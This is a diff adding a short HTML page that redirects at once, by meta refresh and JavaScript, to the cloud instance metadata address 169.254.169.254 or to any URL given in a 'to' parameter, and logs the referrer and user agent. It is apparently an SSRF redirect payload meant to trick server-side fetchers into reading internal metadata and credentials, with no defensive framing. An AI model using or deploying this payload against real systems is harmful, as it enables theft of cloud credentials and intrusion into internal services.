@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="refresh" content="0; url=http://169.254.169.254/latest/meta-data/" />
+    <script>
+        // Récupérer la cible depuis l'URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const target = urlParams.get('to') || 'http://169.254.169.254/latest/meta-data/';
+        
+        // Redirection immédiate
+        window.location.href = target;
+        
+        // Log pour debugging
+        console.log('Redirecting to:', target);
+        console.log('Referrer:', document.referrer);
+        console.log('User-Agent:', navigator.userAgent);
+    </script>
+</head>
+<body>
+    <noscript>
+        <p>Redirecting to internal resource...</p>
+        <p>If redirection doesn't work, check: <span id="target"></span></p>
+        <script>document.getElementById('target').textContent = target;</script>
+    </noscript>
+</body>
+</html>
